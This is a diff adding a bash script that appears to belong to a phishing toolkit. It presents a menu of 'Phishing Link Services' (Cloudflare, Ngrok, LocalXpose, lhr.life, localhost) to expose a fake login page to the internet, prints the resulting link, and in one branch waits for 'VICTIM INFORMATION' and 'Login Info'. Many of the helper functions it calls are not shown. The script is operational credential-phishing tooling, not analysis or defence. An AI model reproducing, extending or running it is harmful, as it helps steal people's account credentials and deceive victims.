@@ -1,0 +1,218 @@
+#!/bin/bash
+echo ""
+
+check_status() {
+        echo -ne "\e[33m Internet Status : "
+        timeout 3s curl -fIs "https://api.github.com" > /dev/null
+        [ $? -eq 0 ] && echo -e "\e[92m Online\e[0m" || echo -e "\e[31mOffline\e[0m"
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function select_url() {
+clear
+logo3
+echo -e "\e[1;96m  \e[m "
+printf " \e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m " 
+echo " "
+printf "\e[1;31m[\e[0m\e[1;92m1\e[0m\e[1;31m] \e[0m\e[1;37;44m Cloudflare \e[0m   \e[0;91m[\e[0;96mAuto Detects\e[0;91m] "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"     
+echo
+printf "\e[1;31m[\e[0m\e[1;92m2\e[0m\e[1;31m] \e[0m\e[1;37;41m Ngrok \e[0m        \e[0;91m[\e[0;96mAccount Token Needed\e[0;91m]   "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m3\e[0m\e[1;31m] \e[0m\e[1;91;107m LocalXpose \e[0m   \e[0;91m[\e[0;95mNEW! \e[96mMax 15Min\e[0;91m]  "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
+echo
+printf "\e[1;31m[\e[0m\e[1;92m4\e[0m\e[1;31m] \e[0m\e[1;48;5;21m lhr.Life \e[0m     \e[0;91m[\e[0;95mNEW!\e[0;96m Not Hotspot On\e[0;91m] "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
+echo
+printf "\e[1;31m[\e[0m\e[1;92m5\e[0m\e[1;31m] \e[0m\e[1;48;5;200m LocalHost \e[0m    \e[0;91m[\e[0;96mOnly This Devices!\e[0;91m]  "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
+echo
+printf "\e[1;31m[\e[0m\e[1;92m6\e[0m\e[1;31m] \e[0m\e[1;34;103m Ngrok + Cloudflare + LocalXpose + lhr.Life \e[0m \e[0;91m[\e[0;96mPremium User\e[0;91m]  "
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m" 
+echo
+printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
+echo " "
+
+read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[92m You Want to Choose Phishing Link Services Option : \e[97m ' portfrd
+if [[ $portfrd == "1" || $portfrd == "01" || $portfrd == "cloudflare" ]]; then
+echo ""
+start_cloudflared
+clear
+logo_last
+                           
+			   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Cloudflared Link :\e[0m\e[1;77m %s\e[0m\n" $clink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo ""
+askuri_c
+clear
+logo_last
+sleep 3
+clear
+l_logo
+links_c
+			   
+
+fi
+if [[ $portfrd == "2" || $portfrd == "02" || $portfrd == "ngrok" ]]; then
+echo ""
+clear
+ngroktoken
+start_ngrok
+clear
+logo_last
+                           
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Ngrok Link :\e[0m\e[1;77m %s\e[0m\n" $nlink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo ""
+askuri_nc
+clear
+logo_last
+sleep 3
+clear
+l_logo
+links_n
+
+fi
+if [[ $portfrd == "3" || $portfrd == "03" || $portfrd == "localxpose" ]]; then
+echo ""
+start_loclx
+clear
+logo_last
+                           
+            
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $llink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo ""
+askuri_l
+clear
+logo_last
+sleep 3
+clear
+l_logo
+links_l
+
+
+
+fi
+if [[ $portfrd == "4" || $portfrd == "04" || $portfrd == "lhrlife" ]]; then
+
+echo ""
+start_lhrlife
+clear
+logo_last
+                           
+
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m LocalXpose Link :\e[0m\e[1;77m %s\e[0m\n" $lhrlifelink                                   
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo ""
+askuri_lhrlife
+clear
+logo_last
+sleep 3
+clear
+l_logo
+links_lhrlife
+
+fi
+
+if [[ $portfrd == "5" || $portfrd == "05" || $portfrd == "localhost" ]]; then
+echo ""
+clear
+l_logo
+                           echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+                           echo -e " "
+			   echo -e " "
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33mLocalHost Link :\e[0m\e[1;77m http://127.0.0.1:4444/   \e[0m    "                        
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+			   echo ""
+			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
+                           echo ""
+			   echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;95m Waiting For Login Info, \e[92mCtrl + C \e[1;95mto Exit... \e[93m"
+			   echo ""                
+			   
+fi
+
+if [[ $portfrd == "6" || $portfrd == "06" || $portfrd == "suman" ]]; then
+echo ""
+echo ""
+echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
+echo ""
+start_cloudflared
+echo ""
+start_ngrok
+start_loclx
+start_lhrlife
+clear
+l_logo
+all_links
+			   
+fi
+}
